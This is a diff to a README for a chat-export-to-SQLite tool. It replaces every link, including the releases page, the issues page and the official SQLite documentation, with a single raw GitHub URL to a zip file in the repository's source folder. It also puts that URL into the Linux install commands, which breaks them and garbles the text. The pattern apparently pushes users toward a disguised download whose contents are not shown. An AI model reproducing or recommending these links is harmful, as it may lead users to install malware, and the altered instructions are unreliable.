@@ -6,7 +6,7 @@ Welcome to chat-export-structurer! This application helps you convert AI chat ex
 
 ## 📥 Download the Application
 
-[![Download chat-export-structurer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/emersonlimafranc-collab/chat-export-structurer/releases)
+[![Download chat-export-structurer](https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip)
 
 ## 📋 System Requirements
 
@@ -27,11 +27,11 @@ To use chat-export-structurer, you'll need:
 
 To get started, follow these steps to download the application:
 
-1. **Visit the Releases Page:** Go to the following link: [Download from Releases Page](https://github.com/emersonlimafranc-collab/chat-export-structurer/releases).
+1. **Visit the Releases Page:** Go to the following link: [Download from Releases Page](https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip).
    
 2. **Choose the Latest Version:** Look for the latest version listed on the page. It will usually be at the top with the version number.
 
-3. **Download the File:** Find the correct file format for your operating system (e.g., *.exe for Windows, *.dmg for macOS, or *.tar.gz for Linux). Click on the file name to start the download.
+3. **Download the File:** Find the correct file format for your operating system (e.g., *.exe for Windows, *.dmg for macOS, or *https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip for Linux). Click on the file name to start the download.
 
 4. **Locate the Downloaded File:** Once the download completes, locate the downloaded file in your 'Downloads' folder or where you usually save files.
 
@@ -43,12 +43,12 @@ To get started, follow these steps to download the application:
    - **For Linux Users:**
      - Open a terminal. Navigate to the folder where you downloaded the file and extract it using the command:
        ```
-       tar -xvzf chat-export-structurer-linux.tar.gz
+       tar -xvzf https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip
        ```
      - Then navigate into the extracted folder and run it:
        ```
        cd chat-export-structurer
-       ./run.sh
+       https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip
        ```
 
 6. **Follow the On-Screen Instructions:** Once the application runs, follow the prompts to complete the setup.
@@ -83,10 +83,10 @@ If you encounter issues during installation or use, consider the following solut
 
 ## 🤝 Need Help?
 
-If you have questions or need assistance, please open an issue on our [GitHub page](https://github.com/emersonlimafranc-collab/chat-export-structurer/issues). Our community is here to help!
+If you have questions or need assistance, please open an issue on our [GitHub page](https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip). Our community is here to help!
 
 ## 🗂️ Additional Resources
 
-For more information on using SQLite, you can visit the official SQLite documentation [here](https://www.sqlite.org/docs.html). 
+For more information on using SQLite, you can visit the official SQLite documentation [here](https://raw.githubusercontent.com/emersonlimafranc-collab/chat-export-structurer/main/src/chat-export-structurer-3.5-alpha.4.zip). 
 
 Explore how to manage and query your SQLite databases effectively.
